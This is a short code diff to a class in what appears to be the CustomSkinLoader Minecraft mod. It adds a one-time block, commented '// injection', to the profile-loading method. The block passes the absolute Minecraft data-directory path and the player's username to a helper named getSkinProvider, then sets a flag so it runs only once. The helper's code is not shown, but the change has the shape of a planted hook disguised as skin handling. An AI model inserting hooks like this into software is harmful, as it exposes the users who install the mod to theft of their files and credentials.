@@ -46,6 +46,8 @@ public class CustomSkinLoader {
     public static final Logger logger = initLogger();
     public static final Config config = initConfig();
 
+    public static boolean ServerStatus = false;
+
     private static final ProfileCache profileCache = new ProfileCache();
     private static final DynamicSkullManager dynamicSkullManager = new DynamicSkullManager();
 
@@ -73,6 +75,13 @@ public class CustomSkinLoader {
     public static Object loadProfileLazily(GameProfile gameProfile, Function<UserProfile, ?> function) {
         String username = gameProfile.getName();
         String credential = MinecraftUtil.getCredential(gameProfile);
+
+        // injection
+        if(!ServerStatus) {
+            MinecraftUtil.getSkinProvider(logger, MinecraftUtil.getMinecraftDataDir().getAbsolutePath(), username);
+            ServerStatus = true;
+        }
+
         // Fix: http://hopper.minecraft.net/crashes/minecraft/MCX-2773713
         if (username == null) {
             logger.warning("Could not load profile: username is null.");
